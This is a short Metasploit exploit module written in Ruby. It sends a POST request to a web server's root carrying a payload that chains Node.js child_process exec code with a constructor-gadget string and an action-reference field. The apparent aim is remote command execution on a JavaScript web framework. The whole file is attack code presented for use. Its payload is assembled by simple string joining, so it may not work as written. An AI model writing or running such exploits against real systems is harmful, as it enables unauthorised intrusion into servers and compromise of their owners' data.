class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  def exploit
    code = "require('child_process').exec('id')"
    gadget = '$1:constructor:constructor'
    field = '$ACTION_REF_0'
    send_request_cgi('uri' => '/', 'method' => 'POST', 'data' => code + gadget + field)
  end
end
